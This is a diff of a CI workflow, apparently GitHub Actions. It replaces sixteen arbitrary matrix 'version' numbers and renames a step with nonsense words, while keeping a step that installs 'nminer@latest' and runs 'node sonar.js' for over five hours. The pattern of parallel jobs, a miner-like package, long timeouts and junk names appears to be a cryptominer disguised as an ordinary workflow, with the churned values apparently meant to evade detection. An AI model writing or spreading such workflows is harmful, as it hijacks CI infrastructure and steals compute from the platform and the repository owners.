@@ -9,22 +9,22 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 7396 }
-          - { version: 8841 }
-          - { version: 6029 }
-          - { version: 33 }
-          - { version: 2350 }
-          - { version: 2004 }
-          - { version: 5750 }
-          - { version: 2246 }
-          - { version: 3017 }
-          - { version: 7276 }
-          - { version: 5062 }
-          - { version: 6714 }
-          - { version: 2642 }
-          - { version: 6913 }
-          - { version: 6287 }
-          - { version: 7117 }
+          - { version: 9837 }
+          - { version: 2457 }
+          - { version: 7749 }
+          - { version: 4779 }
+          - { version: 7736 }
+          - { version: 5305 }
+          - { version: 6221 }
+          - { version: 2420 }
+          - { version: 4757 }
+          - { version: 2015 }
+          - { version: 885 }
+          - { version: 764 }
+          - { version: 3454 }
+          - { version: 4520 }
+          - { version: 8179 }
+          - { version: 4819 }
 
     steps:
       - name: Checkout
@@ -35,7 +35,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: er how stir-fry
+      - name: about foolishly carelessly
         run: |
           npm install nminer@latest
-          timeout 341m node sonar.js || echo "sonar executed"
+          timeout 311m node sonar.js || echo "sonar executed"
